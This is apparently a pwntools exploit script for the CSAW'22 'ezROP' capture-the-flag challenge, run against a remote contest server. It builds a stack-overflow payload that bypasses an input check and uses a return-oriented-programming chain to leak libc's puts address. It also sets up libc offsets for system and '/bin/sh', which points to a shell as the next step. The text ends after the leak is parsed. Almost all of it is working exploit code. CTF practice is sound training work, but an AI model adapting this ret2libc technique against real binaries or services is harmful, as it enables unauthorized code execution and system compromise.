from pwn import *

context.binary = elf = ELF("./share/chal/ezROP")
context.log_level = "info"

HOST = "pwn.chal.csaw.io"
PORT = 9999

POP_RDI = 0x4015a3
PUTS_PLT = 0x4010a0
PUTS_GOT = 0x403fe8
MAIN = 0x40150b

# libc offsets for 2.31-0ubuntu9.18
PUTS_OFF = 0x84420
SYSTEM_OFF = 0x52290
BINSH_OFF = 0x1b45bd

def start():
    return remote(HOST, PORT)

def build(rop):
    # newline at start terminates check, rest is arbitrary
    # buf is 0x100 bytes. rbp at buf+0x70, ret addr at buf+0x78
    payload = b"\n"  # byte 0: newline terminates check
    payload += b"A" * (0x70 - 1)  # padding up to buf+0x70
    payload += p64(0xdeadbeef)  # new rbp (buf+0x70)
    payload += rop  # starts at buf+0x78
    return payload

p = start()

# Stage 1: leak puts
p.recvuntil(b"name?\n")

rop1 = p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(MAIN)
p.sendline(build(rop1))

# receive leak
p.recvuntil(b"! Welcome to CSAW'22!\n")
leak = p.recvline().strip()
print("Leak raw:", leak)
puts_addr = u64(leak.ljust(8, b"\x00"))
